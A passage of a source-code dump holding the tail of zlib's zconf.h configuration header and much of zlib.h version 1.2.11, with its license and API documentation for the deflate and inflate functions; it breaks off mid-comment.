#ifdef SMALL_MEDIUM
   /* Borland C/C++ and some old MSC versions ignore FAR inside typedef */
#  define Bytef Byte FAR
#else
   typedef Byte  FAR Bytef;
#endif
typedef char  FAR charf;
typedef int   FAR intf;
typedef uInt  FAR uIntf;
typedef uLong FAR uLongf;

#ifdef STDC
   typedef void const *voidpc;
   typedef void FAR   *voidpf;
   typedef void       *voidp;
#else
   typedef Byte const *voidpc;
   typedef Byte FAR   *voidpf;
   typedef Byte       *voidp;
#endif

#if !defined(Z_U4) && !defined(Z_SOLO) && defined(STDC)
#  include <limits.h>
#  if (UINT_MAX == 0xffffffffUL)
#    define Z_U4 unsigned
#  elif (ULONG_MAX == 0xffffffffUL)
#    define Z_U4 unsigned long
#  elif (USHRT_MAX == 0xffffffffUL)
#    define Z_U4 unsigned short
#  endif
#endif

#ifdef Z_U4
   typedef Z_U4 z_crc_t;
#else
   typedef unsigned long z_crc_t;
#endif

#ifdef HAVE_UNISTD_H    /* may be set to #if 1 by ./configure */
#  define Z_HAVE_UNISTD_H
#endif

#ifdef HAVE_STDARG_H    /* may be set to #if 1 by ./configure */
#  define Z_HAVE_STDARG_H
#endif

#ifdef STDC
#  ifndef Z_SOLO
#    include <sys/types.h>      /* for off_t */
#  endif
#endif

#if defined(STDC) || defined(Z_HAVE_STDARG_H)
#  ifndef Z_SOLO
#    include <stdarg.h>         /* for va_list */
#  endif
#endif

#ifdef _WIN32
#  ifndef Z_SOLO
#    include <stddef.h>         /* for wchar_t */
#  endif
#endif

/* a little trick to accommodate both "#define _LARGEFILE64_SOURCE" and
 * "#define _LARGEFILE64_SOURCE 1" as requesting 64-bit operations, (even
 * though the former does not conform to the LFS document), but considering
 * both "#undef _LARGEFILE64_SOURCE" and "#define _LARGEFILE64_SOURCE 0" as
 * equivalently requesting no 64-bit operations
 */
#if defined(_LARGEFILE64_SOURCE) && -_LARGEFILE64_SOURCE - -1 == 1
#  undef _LARGEFILE64_SOURCE
#endif

#if defined(__WATCOMC__) && !defined(Z_HAVE_UNISTD_H)
#  define Z_HAVE_UNISTD_H
#endif
#ifndef Z_SOLO
#  if defined(Z_HAVE_UNISTD_H) || defined(_LARGEFILE64_SOURCE)
#    include <unistd.h>         /* for SEEK_*, off_t, and _LFS64_LARGEFILE */
#    ifdef VMS
#      include <unixio.h>       /* for off_t */
#    endif
#    ifndef z_off_t
#      define z_off_t off_t
#    endif
#  endif
#endif

#if defined(_LFS64_LARGEFILE) && _LFS64_LARGEFILE-0
#  define Z_LFS64
#endif

#if defined(_LARGEFILE64_SOURCE) && defined(Z_LFS64)
#  define Z_LARGE64
#endif

#if defined(_FILE_OFFSET_BITS) && _FILE_OFFSET_BITS-0 == 64 && defined(Z_LFS64)
#  define Z_WANT64
#endif

#if !defined(SEEK_SET) && !defined(Z_SOLO)
#  define SEEK_SET        0       /* Seek from beginning of file.  */
#  define SEEK_CUR        1       /* Seek from current position.  */
#  define SEEK_END        2       /* Set file pointer to EOF plus "offset" */
#endif

#ifndef z_off_t
#  define z_off_t long
#endif

#if !defined(_WIN32) && defined(Z_LARGE64)
#  define z_off64_t off64_t
#else
#  if defined(_WIN32) && !defined(__GNUC__) && !defined(Z_SOLO)
#    define z_off64_t __int64
#  else
#    define z_off64_t z_off_t
#  endif
#endif

/* MVS linker does not support external names larger than 8 bytes */
#if defined(__MVS__)
  #pragma map(deflateInit_,"DEIN")
  #pragma map(deflateInit2_,"DEIN2")
  #pragma map(deflateEnd,"DEEND")
  #pragma map(deflateBound,"DEBND")
  #pragma map(inflateInit_,"ININ")
  #pragma map(inflateInit2_,"ININ2")
  #pragma map(inflateEnd,"INEND")
  #pragma map(inflateSync,"INSY")
  #pragma map(inflateSetDictionary,"INSEDI")
  #pragma map(compressBound,"CMBND")
  #pragma map(inflate_table,"INTABL")
  #pragma map(inflate_fast,"INFA")
  #pragma map(inflate_copyright,"INCOPY")
#endif

#endif /* ZCONF_H */

```

`source/wdextract/wdextract/zlib.h`:

```h
/* zlib.h -- interface of the 'zlib' general purpose compression library
  version 1.2.11, January 15th, 2017

  Copyright (C) 1995-2017 Jean-loup Gailly and Mark Adler

  This software is provided 'as-is', without any express or implied
  warranty.  In no event will the authors be held liable for any damages
  arising from the use of this software.

  Permission is granted to anyone to use this software for any purpose,
  including commercial applications, and to alter it and redistribute it
  freely, subject to the following restrictions:

  1. The origin of this software must not be misrepresented; you must not
     claim that you wrote the original software. If you use this software
     in a product, an acknowledgment in the product documentation would be
     appreciated but is not required.
  2. Altered source versions must be plainly marked as such, and must not be
     misrepresented as being the original software.
  3. This notice may not be removed or altered from any source distribution.

  Jean-loup Gailly        Mark Adler
  jloup@gzip.org          madler@alumni.caltech.edu


  The data format used by the zlib library is described by RFCs (Request for
  Comments) 1950 to 1952 in the files http://tools.ietf.org/html/rfc1950
  (zlib format), rfc1951 (deflate format) and rfc1952 (gzip format).
*/

#ifndef ZLIB_H
#define ZLIB_H

#include "zconf.h"

#ifdef __cplusplus
extern "C" {
#endif

#define ZLIB_VERSION "1.2.11"
#define ZLIB_VERNUM 0x12b0
#define ZLIB_VER_MAJOR 1
#define ZLIB_VER_MINOR 2
#define ZLIB_VER_REVISION 11
#define ZLIB_VER_SUBREVISION 0

/*
    The 'zlib' compression library provides in-memory compression and
  decompression functions, including integrity checks of the uncompressed data.
  This version of the library supports only one compression method (deflation)
  but other algorithms will be added later and will have the same stream
  interface.

    Compression can be done in a single step if the buffers are large enough,
  or can be done by repeated calls of the compression function.  In the latter
  case, the application must provide more input and/or consume the output
  (providing more output space) before each call.

    The compressed data format used by default by the in-memory functions is
  the zlib format, which is a zlib wrapper documented in RFC 1950, wrapped
  around a deflate stream, which is itself documented in RFC 1951.

    The library also supports reading and writing files in gzip (.gz) format
  with an interface similar to that of stdio using the functions that start
  with "gz".  The gzip format is different from the zlib format.  gzip is a
  gzip wrapper, documented in RFC 1952, wrapped around a deflate stream.

    This library can optionally read and write gzip and raw deflate streams in
  memory as well.

    The zlib format was designed to be compact and fast for use in memory
  and on communications channels.  The gzip format was designed for single-
  file compression on file systems, has a larger header than zlib to maintain
  directory information, and uses a different, slower check method than zlib.

    The library does not install any signal handler.  The decoder checks
  the consistency of the compressed data, so the library should never crash
  even in the case of corrupted input.
*/

typedef voidpf (*alloc_func) OF((voidpf opaque, uInt items, uInt size));
typedef void   (*free_func)  OF((voidpf opaque, voidpf address));

struct internal_state;

typedef struct z_stream_s {
    z_const Bytef *next_in;     /* next input byte */
    uInt     avail_in;  /* number of bytes available at next_in */
    uLong    total_in;  /* total number of input bytes read so far */

    Bytef    *next_out; /* next output byte will go here */
    uInt     avail_out; /* remaining free space at next_out */
    uLong    total_out; /* total number of bytes output so far */

    z_const char *msg;  /* last error message, NULL if no error */
    struct internal_state FAR *state; /* not visible by applications */

    alloc_func zalloc;  /* used to allocate the internal state */
    free_func  zfree;   /* used to free the internal state */
    voidpf     opaque;  /* private data object passed to zalloc and zfree */

    int     data_type;  /* best guess about the data type: binary or text
                           for deflate, or the decoding state for inflate */
    uLong   adler;      /* Adler-32 or CRC-32 value of the uncompressed data */
    uLong   reserved;   /* reserved for future use */
} z_stream;

typedef z_stream FAR *z_streamp;

/*
     gzip header information passed to and from zlib routines.  See RFC 1952
  for more details on the meanings of these fields.
*/
typedef struct gz_header_s {
    int     text;       /* true if compressed data believed to be text */
    uLong   time;       /* modification time */
    int     xflags;     /* extra flags (not used when writing a gzip file) */
    int     os;         /* operating system */
    Bytef   *extra;     /* pointer to extra field or Z_NULL if none */
    uInt    extra_len;  /* extra field length (valid if extra != Z_NULL) */
    uInt    extra_max;  /* space at extra (only when reading header) */
    Bytef   *name;      /* pointer to zero-terminated file name or Z_NULL */
    uInt    name_max;   /* space at name (only when reading header) */
    Bytef   *comment;   /* pointer to zero-terminated comment or Z_NULL */
    uInt    comm_max;   /* space at comment (only when reading header) */
    int     hcrc;       /* true if there was or will be a header crc */
    int     done;       /* true when done reading gzip header (not used
                           when writing a gzip file) */
} gz_header;

typedef gz_header FAR *gz_headerp;

/*
     The application must update next_in and avail_in when avail_in has dropped
   to zero.  It must update next_out and avail_out when avail_out has dropped
   to zero.  The application must initialize zalloc, zfree and opaque before
   calling the init function.  All other fields are set by the compression
   library and must not be updated by the application.

     The opaque value provided by the application will be passed as the first
   parameter for calls of zalloc and zfree.  This can be useful for custom
   memory management.  The compression library attaches no meaning to the
   opaque value.

     zalloc must return Z_NULL if there is not enough memory for the object.
   If zlib is used in a multi-threaded application, zalloc and zfree must be
   thread safe.  In that case, zlib is thread-safe.  When zalloc and zfree are
   Z_NULL on entry to the initialization function, they are set to internal
   routines that use the standard library functions malloc() and free().

     On 16-bit systems, the functions zalloc and zfree must be able to allocate
   exactly 65536 bytes, but will not be required to allocate more than this if
   the symbol MAXSEG_64K is defined (see zconf.h).  WARNING: On MSDOS, pointers
   returned by zalloc for objects of exactly 65536 bytes *must* have their
   offset normalized to zero.  The default allocation function provided by this
   library ensures this (see zutil.c).  To reduce memory requirements and avoid
   any allocation of 64K objects, at the expense of compression ratio, compile
   the library with -DMAX_WBITS=14 (see zconf.h).

     The fields total_in and total_out can be used for statistics or progress
   reports.  After compression, total_in holds the total size of the
   uncompressed data and may be saved for use by the decompressor (particularly
   if the decompressor wants to decompress everything in a single step).
*/

                        /* constants */

#define Z_NO_FLUSH      0
#define Z_PARTIAL_FLUSH 1
#define Z_SYNC_FLUSH    2
#define Z_FULL_FLUSH    3
#define Z_FINISH        4
#define Z_BLOCK         5
#define Z_TREES         6
/* Allowed flush values; see deflate() and inflate() below for details */

#define Z_OK            0
#define Z_STREAM_END    1
#define Z_NEED_DICT     2
#define Z_ERRNO        (-1)
#define Z_STREAM_ERROR (-2)
#define Z_DATA_ERROR   (-3)
#define Z_MEM_ERROR    (-4)
#define Z_BUF_ERROR    (-5)
#define Z_VERSION_ERROR (-6)
/* Return codes for the compression/decompression functions. Negative values
 * are errors, positive values are used for special but normal events.
 */

#define Z_NO_COMPRESSION         0
#define Z_BEST_SPEED             1
#define Z_BEST_COMPRESSION       9
#define Z_DEFAULT_COMPRESSION  (-1)
/* compression levels */

#define Z_FILTERED            1
#define Z_HUFFMAN_ONLY        2
#define Z_RLE                 3
#define Z_FIXED               4
#define Z_DEFAULT_STRATEGY    0
/* compression strategy; see deflateInit2() below for details */

#define Z_BINARY   0
#define Z_TEXT     1
#define Z_ASCII    Z_TEXT   /* for compatibility with 1.2.2 and earlier */
#define Z_UNKNOWN  2
/* Possible values of the data_type field for deflate() */

#define Z_DEFLATED   8
/* The deflate compression method (the only one supported in this version) */

#define Z_NULL  0  /* for initializing zalloc, zfree, opaque */

#define zlib_version zlibVersion()
/* for compatibility with versions < 1.0.2 */


                        /* basic functions */

ZEXTERN const char * ZEXPORT zlibVersion OF((void));
/* The application can compare zlibVersion and ZLIB_VERSION for consistency.
   If the first character differs, the library code actually used is not
   compatible with the zlib.h header file used by the application.  This check
   is automatically made by deflateInit and inflateInit.
 */

/*
ZEXTERN int ZEXPORT deflateInit OF((z_streamp strm, int level));

     Initializes the internal stream state for compression.  The fields
   zalloc, zfree and opaque must be initialized before by the caller.  If
   zalloc and zfree are set to Z_NULL, deflateInit updates them to use default
   allocation functions.

     The compression level must be Z_DEFAULT_COMPRESSION, or between 0 and 9:
   1 gives best speed, 9 gives best compression, 0 gives no compression at all
   (the input data is simply copied a block at a time).  Z_DEFAULT_COMPRESSION
   requests a default compromise between speed and compression (currently
   equivalent to level 6).

     deflateInit returns Z_OK if success, Z_MEM_ERROR if there was not enough
   memory, Z_STREAM_ERROR if level is not a valid compression level, or
   Z_VERSION_ERROR if the zlib library version (zlib_version) is incompatible
   with the version assumed by the caller (ZLIB_VERSION).  msg is set to null
   if there is no error message.  deflateInit does not perform any compression:
   this will be done by deflate().
*/


ZEXTERN int ZEXPORT deflate OF((z_streamp strm, int flush));
/*
    deflate compresses as much data as possible, and stops when the input
  buffer becomes empty or the output buffer becomes full.  It may introduce
  some output latency (reading input without producing any output) except when
  forced to flush.

    The detailed semantics are as follows.  deflate performs one or both of the
  following actions:

  - Compress more input starting at next_in and update next_in and avail_in
    accordingly.  If not all input can be processed (because there is not
    enough room in the output buffer), next_in and avail_in are updated and
    processing will resume at this point for the next call of deflate().

  - Generate more output starting at next_out and update next_out and avail_out
    accordingly.  This action is forced if the parameter flush is non zero.
    Forcing flush frequently degrades the compression ratio, so this parameter
    should be set only when necessary.  Some output may be provided even if
    flush is zero.

    Before the call of deflate(), the application should ensure that at least
  one of the actions is possible, by providing more input and/or consuming more
  output, and updating avail_in or avail_out accordingly; avail_out should
  never be zero before the call.  The application can consume the compressed
  output when it wants, for example when the output buffer is full (avail_out
  == 0), or after each call of deflate().  If deflate returns Z_OK and with
  zero avail_out, it must be called again after making room in the output
  buffer because there might be more output pending. See deflatePending(),
  which can be used if desired to determine whether or not there is more ouput
  in that case.

    Normally the parameter flush is set to Z_NO_FLUSH, which allows deflate to
  decide how much data to accumulate before producing output, in order to
  maximize compression.

    If the parameter flush is set to Z_SYNC_FLUSH, all pending output is
  flushed to the output buffer and the output is aligned on a byte boundary, so
  that the decompressor can get all input data available so far.  (In
  particular avail_in is zero after the call if enough output space has been
  provided before the call.) Flushing may degrade compression for some
  compression algorithms and so it should be used only when necessary.  This
  completes the current deflate block and follows it with an empty stored block
  that is three bits plus filler bits to the next byte, followed by four bytes
  (00 00 ff ff).

    If flush is set to Z_PARTIAL_FLUSH, all pending output is flushed to the
  output buffer, but the output is not aligned to a byte boundary.  All of the
  input data so far will be available to the decompressor, as for Z_SYNC_FLUSH.
  This completes the current deflate block and follows it with an empty fixed
  codes block that is 10 bits long.  This assures that enough bytes are output
  in order for the decompressor to finish the block before the empty fixed
  codes block.

    If flush is set to Z_BLOCK, a deflate block is completed and emitted, as
  for Z_SYNC_FLUSH, but the output is not aligned on a byte boundary, and up to
  seven bits of the current block are held to be written as the next byte after
  the next deflate block is completed.  In this case, the decompressor may not
  be provided enough bits at this point in order to complete decompression of
  the data provided so far to the compressor.  It may need to wait for the next
  block to be emitted.  This is for advanced applications that need to control
  the emission of deflate blocks.

    If flush is set to Z_FULL_FLUSH, all output is flushed as with
  Z_SYNC_FLUSH, and the compression state is reset so that decompression can
  restart from this point if previous compressed data has been damaged or if
  random access is desired.  Using Z_FULL_FLUSH too often can seriously degrade
  compression.

    If deflate returns with avail_out == 0, this function must be called again
  with the same value of the flush parameter and more output space (updated
  avail_out), until the flush is complete (deflate returns with non-zero
  avail_out).  In the case of a Z_FULL_FLUSH or Z_SYNC_FLUSH, make sure that
  avail_out is greater than six to avoid repeated flush markers due to
  avail_out == 0 on return.

    If the parameter flush is set to Z_FINISH, pending input is processed,
  pending output is flushed and deflate returns with Z_STREAM_END if there was
  enough output space.  If deflate returns with Z_OK or Z_BUF_ERROR, this
  function must be called again with Z_FINISH and more output space (updated
  avail_out) but no more input data, until it returns with Z_STREAM_END or an
  error.  After deflate has returned Z_STREAM_END, the only possible operations
  on the stream are deflateReset or deflateEnd.

    Z_FINISH can be used in the first deflate call after deflateInit if all the
  compression is to be done in a single step.  In order to complete in one
  call, avail_out must be at least the value returned by deflateBound (see
  below).  Then deflate is guaranteed to return Z_STREAM_END.  If not enough
  output space is provided, deflate will not return Z_STREAM_END, and it must
  be called again as described above.

    deflate() sets strm->adler to the Adler-32 checksum of all input read
  so far (that is, total_in bytes).  If a gzip stream is being generated, then
  strm->adler will be the CRC-32 checksum of the input read so far.  (See
  deflateInit2 below.)

    deflate() may update strm->data_type if it can make a good guess about
  the input data type (Z_BINARY or Z_TEXT).  If in doubt, the data is
  considered binary.  This field is only for information purposes and does not
  affect the compression algorithm in any manner.

    deflate() returns Z_OK if some progress has been made (more input
  processed or more output produced), Z_STREAM_END if all input has been
  consumed and all output has been produced (only when flush is set to
  Z_FINISH), Z_STREAM_ERROR if the stream state was inconsistent (for example
  if next_in or next_out was Z_NULL or the state was inadvertently written over
  by the application), or Z_BUF_ERROR if no progress is possible (for example
  avail_in or avail_out was zero).  Note that Z_BUF_ERROR is not fatal, and
  deflate() can be called again with more input and more output space to
  continue compressing.
*/


ZEXTERN int ZEXPORT deflateEnd OF((z_streamp strm));
/*
     All dynamically allocated data structures for this stream are freed.
   This function discards any unprocessed input and does not flush any pending
   output.

     deflateEnd returns Z_OK if success, Z_STREAM_ERROR if the
   stream state was inconsistent, Z_DATA_ERROR if the stream was freed
   prematurely (some input or output was discarded).  In the error case, msg
   may be set but then points to a static string (which must not be
   deallocated).
*/


/*
ZEXTERN int ZEXPORT inflateInit OF((z_streamp strm));

     Initializes the internal stream state for decompression.  The fields
   next_in, avail_in, zalloc, zfree and opaque must be initialized before by
   the caller.  In the current version of inflate, the provided input is not
   read or consumed.  The allocation of a sliding window will be deferred to
   the first call of inflate (if the decompression does not complete on the
   first call).  If zalloc and zfree are set to Z_NULL, inflateInit updates
   them to use default allocation functions.

     inflateInit returns Z_OK if success, Z_MEM_ERROR if there was not enough
   memory, Z_VERSION_ERROR if the zlib library version is incompatible with the
   version assumed by the caller, or Z_STREAM_ERROR if the parameters are
   invalid, such as a null pointer to the structure.  msg is set to null if
   there is no error message.  inflateInit does not perform any decompression.
   Actual decompression will be done by inflate().  So next_in, and avail_in,
   next_out, and avail_out are unused and unchanged.  The current
   implementation of inflateInit() does not process any header information --
   that is deferred until inflate() is called.
*/


ZEXTERN int ZEXPORT inflate OF((z_streamp strm, int flush));
/*
    inflate decompresses as much data as possible, and stops when the input
  buffer becomes empty or the output buffer becomes full.  It may introduce
  some output latency (reading input without producing any output) except when
  forced to flush.

  The detailed semantics are as follows.  inflate performs one or both of the
  following actions:

  - Decompress more input starting at next_in and update next_in and avail_in
    accordingly.  If not all input can be processed (because there is not
    enough room in the output buffer), then next_in and avail_in are updated
    accordingly, and processing will resume at this point for the next call of
    inflate().

  - Generate more output starting at next_out and update next_out and avail_out
    accordingly.  inflate() provides as much output as possible, until there is
    no more input data or no more space in the output buffer (see below about
    the flush parameter).

    Before the call of inflate(), the application should ensure that at least
  one of the actions is possible, by providing more input and/or consuming more
  output, and updating the next_* and avail_* values accordingly.  If the
  caller of inflate() does not provide both available input and available
  output space, it is possible that there will be no progress made.  The
  application can consume the uncompressed output when it wants, for example
  when the output buffer is full (avail_out == 0), or after each call of
  inflate().  If inflate returns Z_OK and with zero avail_out, it must be
  called again after making room in the output buffer because there might be
  more output pending.

    The flush parameter of inflate() can be Z_NO_FLUSH, Z_SYNC_FLUSH, Z_FINISH,
  Z_BLOCK, or Z_TREES.  Z_SYNC_FLUSH requests that inflate() flush as much
  output as possible to the output buffer.  Z_BLOCK requests that inflate()
  stop if and when it gets to the next deflate block boundary.  When decoding
  the zlib or gzip format, this will cause inflate() to return immediately
  after the header and before the first block.  When doing a raw inflate,
  inflate() will go ahead and process the first block, and will return when it
  gets to the end of that block, or when it runs out of data.

    The Z_BLOCK option assists in appending to or combining deflate streams.
  To assist in this, on return inflate() always sets strm->data_type to the
  number of unused bits in the last byte taken from strm->next_in, plus 64 if
  inflate() is currently decoding the last block in the deflate stream, plus
  128 if inflate() returned immediately after decoding an end-of-block code or
  decoding the complete header up to just before the first byte of the deflate
  stream.  The end-of-block will not be indicated until all of the uncompressed
  data from that block has been written to strm->next_out.  The number of
  unused bits may in general be greater than seven, except when bit 7 of
  data_type is set, in which case the number of unused bits will be less than
  eight.  data_type is set as noted here every time inflate() returns for all
  flush options, and so can be used to determine the amount of currently
  consumed input in bits.

    The Z_TREES option behaves as Z_BLOCK does, but it also returns when the
  end of each deflate block header is reached, before any actual data in that
  block is decoded.  This allows the caller to determine the length of the
  deflate block header for later use in random access within a deflate block.
  256 is added to the value of strm->data_type when inflate() returns
  immediately after reaching the end of the deflate block header.

    inflate() should normally be called until it returns Z_STREAM_END or an
  error.  However if all decompression is to be performed in a single step (a
  single call of inflate), the parameter flush should be set to Z_FINISH.  In
  this case all pending input is processed and all pending output is flushed;
  avail_out must be large enough to hold all of the uncompressed data for the
  operation to complete.  (The size of the uncompressed data may have been
  saved by the compressor for this purpose.)  The use of Z_FINISH is not
  required to perform an inflation in one step.  However it may be used to
  inform inflate that a faster approach can be used for the single inflate()
  call.  Z_FINISH also informs inflate to not maintain a sliding window if the
  stream completes, which reduces inflate's memory footprint.  If the stream
  does not complete, either because not all of the stream is provided or not
  enough output space is provided, then a sliding window will be allocated and
  inflate() can be called again to continue the operation as if Z_NO_FLUSH had
  been used.

     In this implementation, inflate() always flushes as much output as
  possible to the output buffer, and always uses the faster approach on the
  first call.  So the effects of the flush parameter in this implementation are
  on the return value of inflate() as noted below, when inflate() returns early
  when Z_BLOCK or Z_TREES is used, and when inflate() avoids the allocation of
  memory for a sliding window when Z_FINISH is used.

     If a preset dictionary is needed after this call (see inflateSetDictionary
  below), inflate sets strm->adler to the Adler-32 checksum of the dictionary
  chosen by the compressor and returns Z_NEED_DICT; otherwise it sets
  strm->adler to the Adler-32 checksum of all output produced so far (that is,
  total_out bytes) and returns Z_OK, Z_STREAM_END or an error code as described
  below.  At the end of the stream, inflate() checks that its computed Adler-32
  checksum is equal to that saved by the compressor and returns Z_STREAM_END
  only if the checksum is correct.

    inflate() can decompress and check either zlib-wrapped or gzip-wrapped
  deflate data.  The header type is detected automatically, if requested when
  initializing with inflateInit2().  Any information contained in the gzip
  header is not retained unless inflateGetHeader() is used.  When processing
  gzip-wrapped deflate data, strm->adler32 is set to the CRC-32 of the output
  produced so far.  The CRC-32 is checked against the gzip trailer, as is the
  uncompressed length, modulo 2^32.

    inflate() returns Z_OK if some progress has been made (more input processed
  or more output produced), Z_STREAM_END if the end of the compressed data has
  been reached and all uncompressed output has been produced, Z_NEED_DICT if a
  preset dictionary is needed at this point, Z_DATA_ERROR if the input data was
  corrupted (input stream not conforming to the zlib format or incorrect check
  value, in which case strm->msg points to a string with a more specific
  error), Z_STREAM_ERROR if the stream structure was inconsistent (for example
  next_in or next_out was Z_NULL, or the state was inadvertently written over
  by the application), Z_MEM_ERROR if there was not enough memory, Z_BUF_ERROR
  if no progress was possible or if there was not enough room in the output
  buffer when Z_FINISH is used.  Note that Z_BUF_ERROR is not fatal, and
  inflate() can be called again with more input and more output space to
  continue decompressing.  If Z_DATA_ERROR is returned, the application may
  then call inflateSync() to look for a good compression block if a partial
  recovery of the data is to be attempted.
*/


ZEXTERN int ZEXPORT inflateEnd OF((z_streamp strm));
/*
     All dynamically allocated data structures for this stream are freed.
   This function discards any unprocessed input and does not flush any pending
   output.

     inflateEnd returns Z_OK if success, or Z_STREAM_ERROR if the stream state
   was inconsistent.
*/


                        /* Advanced functions */

/*
    The following functions are needed only in some special applications.
*/

/*
ZEXTERN int ZEXPORT deflateInit2 OF((z_streamp strm,
                                     int  level,
                                     int  method,
                                     int  windowBits,
                                     int  memLevel,
                                     int  strategy));

     This is another version of deflateInit with more compression options.  The
   fields next_in, zalloc, zfree and opaque must be initialized before by the
   caller.

     The method parameter is the compression method.  It must be Z_DEFLATED in
   this version of the library.

     The windowBits parameter is the base two logarithm of the window size
   (the size of the history buffer).  It should be in the range 8..15 for this
   version of the library.  Larger values of this parameter result in better
   compression at the expense of memory usage.  The default value is 15 if
   deflateInit is used instead.

     For the current implementation of deflate(), a windowBits value of 8 (a
   window size of 256 bytes) is not supported.  As a result, a request for 8
   will result in 9 (a 512-byte window).  In that case, providing 8 to
   inflateInit2() will result in an error when the zlib header with 9 is
   checked against the initialization of inflate().  The remedy is to not use 8
   with deflateInit2() with this initialization, or at least in that case use 9
   with inflateInit2().

     windowBits can also be -8..-15 for raw deflate.  In this case, -windowBits
   determines the window size.  deflate() will then generate raw deflate data
   with no zlib header or trailer, and will not compute a check value.

     windowBits can also be greater than 15 for optional gzip encoding.  Add
   16 to windowBits to write a simple gzip header and trailer around the
   compressed data instead of a zlib wrapper.  The gzip header will have no
   file name, no extra data, no comment, no modification time (set to zero), no
   header crc, and the operating system will be set to the appropriate value,
   if the operating system was determined at compile time.  If a gzip stream is
   being written, strm->adler is a CRC-32 instead of an Adler-32.

     For raw deflate or gzip encoding, a request for a 256-byte window is
   rejected as invalid, since only the zlib header provides a means of
   transmitting the window size to the decompressor.

     The memLevel parameter specifies how much memory should be allocated
   for the internal compression state.  memLevel=1 uses minimum memory but is
   slow and reduces compression ratio; memLevel=9 uses maximum memory for
   optimal speed.  The default value is 8.  See zconf.h for total memory usage
   as a function of windowBits and memLevel.

     The strategy parameter is used to tune the compression algorithm.  Use the
   value Z_DEFAULT_STRATEGY for normal data, Z_FILTERED for data produced by a
   filter (or predictor), Z_HUFFMAN_ONLY to force Huffman encoding only (no
   string match), or Z_RLE to limit match distances to one (run-length
   encoding).  Filtered data consists mostly of small values with a somewhat
   random distribution.  In this case, the compression algorithm is tuned to
   compress them better.  The effect of Z_FILTERED is to force more Huffman
   coding and less string matching; it is somewhat intermediate between
   Z_DEFAULT_STRATEGY and Z_HUFFMAN_ONLY.  Z_RLE is designed to be almost as
   fast as Z_HUFFMAN_ONLY, but give better compression for PNG image data.  The
   strategy parameter only affects the compression ratio but not the
   correctness of the compressed output even if it is not set appropriately.
   Z_FIXED prevents the use of dynamic Huffman codes, allowing for a simpler
   decoder for special applications.

     deflateInit2 returns Z_OK if success, Z_MEM_ERROR if there was not enough
   memory, Z_STREAM_ERROR if any parameter is invalid (such as an invalid
   method), or Z_VERSION_ERROR if the zlib library version (zlib_version) is
   incompatible with the version assumed by the caller (ZLIB_VERSION).  msg is
   set to null if there is no error message.  deflateInit2 does not perform any
   compression: this will be done by deflate().
*/

ZEXTERN int ZEXPORT deflateSetDictionary OF((z_streamp strm,
                                             const Bytef *dictionary,
                                             uInt  dictLength));
/*
     Initializes the compression dictionary from the given byte sequence
   without producing any compressed output.  When using the zlib format, this
   function must be called immediately after deflateInit, deflateInit2 or
   deflateReset, and before any call of deflate.  When doing raw deflate, this
   function must be called either before any call of deflate, or immediately
   after the completion of a deflate block, i.e. after all input has been
   consumed and all output has been delivered when using any of the flush
   options Z_BLOCK, Z_PARTIAL_FLUSH, Z_SYNC_FLUSH, or Z_FULL_FLUSH.  The
   compressor and decompressor must use exactly the same dictionary (see
   inflateSetDictionary).

     The dictionary should consist of strings (byte sequences) that are likely
   to be encountered later in the data to be compressed, with the most commonly
   used strings preferably put towards the end of the dictionary.  Using a
   dictionary is most useful when the data to be compressed is short and can be
   predicted with good accuracy; the data can then be compressed better than
   with the default empty dictionary.

     Depending on the size of the compression data structures selected by
   deflateInit or deflateInit2, a part of the dictionary may in effect be
   discarded, for example if the dictionary is larger than the window size
   provided in deflateInit or deflateInit2.  Thus the strings most likely to be
   useful should be put at the end of the dictionary, not at the front.  In
   addition, the current implementation of deflate will use at most the window
   size minus 262 bytes of the provided dictionary.

     Upon return of this function, strm->adler is set to the Adler-32 value
   of the dictionary; the decompressor may later use this value to determine
   which dictionary has been used by the compressor.  (The Adler-32 value
   applies to the whole dictionary even if only a subset of the dictionary is
   actually used by the compressor.) If a raw deflate was requested, then the
   Adler-32 value is not computed and strm->adler is not set.

     deflateSetDictionary returns Z_OK if success, or Z_STREAM_ERROR if a
   parameter is invalid (e.g.  dictionary being Z_NULL) or the stream state is
   inconsistent (for example if deflate has already been called for this stream
   or if not at a block boundary for raw deflate).  deflateSetDictionary does
   not perform any compression: this will be done by deflate().
*/

ZEXTERN int ZEXPORT deflateGetDictionary OF((z_streamp strm,
                                             Bytef *dictionary,
                                             uInt  *dictLength));
/*
     Returns the sliding dictionary being maintained by deflate.  dictLength is
   set to the number of bytes in the dictionary, and that many bytes are copied
   to dictionary.  dictionary must have enough space, where 32768 bytes is
   always enough.  If deflateGetDictionary() is called with dictionary equal to
   Z_NULL, then only the dictionary length is returned, and nothing is copied.
   Similary, if dictLength is Z_NULL, then it is not set.

     deflateGetDictionary() may return a length less than the window size, even
   when more than the window size in input has been provided. It may return up
   to 258 bytes less in that case, due to how zlib's implementation of deflate
   manages the sliding window and lookahead for matches, where matches can be
   up to 258 bytes long. If the application needs the last window-size bytes of
   input, then that would need to be saved by the application outside of zlib.

     deflateGetDictionary returns Z_OK on success, or Z_STREAM_ERROR if the
   stream state is inconsistent.
*/

ZEXTERN int ZEXPORT deflateCopy OF((z_streamp dest,
                                    z_streamp source));
/*
     Sets the destination stream as a complete copy of the source stream.

     This function can be useful when several compression strategies will be
   tried, for example when there are several ways of pre-processing the input
   data with a filter.  The streams that will be discarded should then be freed
   by calling deflateEnd.  Note that deflateCopy duplicates the internal
   compression state which can be quite large, so this strategy is slow and can
   consume lots of memory.

     deflateCopy returns Z_OK if success, Z_MEM_ERROR if there was not
   enough memory, Z_STREAM_ERROR if the source stream state was inconsistent
   (such as zalloc being Z_NULL).  msg is left unchanged in both source and
   destination.
*/

ZEXTERN int ZEXPORT deflateReset OF((z_streamp strm));
/*
     This function is equivalent to deflateEnd followed by deflateInit, but
   does not free and reallocate the internal compression state.  The stream
   will leave the compression level and any other attributes that may have been
   set unchanged.

     deflateReset returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent (such as zalloc or state being Z_NULL).
*/

ZEXTERN int ZEXPORT deflateParams OF((z_streamp strm,
                                      int level,
                                      int strategy));
/*
     Dynamically update the compression level and compression strategy.  The
   interpretation of level and strategy is as in deflateInit2().  This can be
   used to switch between compression and straight copy of the input data, or
   to switch to a different kind of input data requiring a different strategy.
   If the compression approach (which is a function of the level) or the
   strategy is changed, and if any input has been consumed in a previous
   deflate() call, then the input available so far is compressed with the old
   level and strategy using deflate(strm, Z_BLOCK).  There are three approaches
   for the compression levels 0, 1..3, and 4..9 respectively.  The new level
   and strategy will take effect at the next call of deflate().

     If a deflate(strm, Z_BLOCK) is performed by deflateParams(), and it does
   not have enough output space to complete, then the parameter change will not
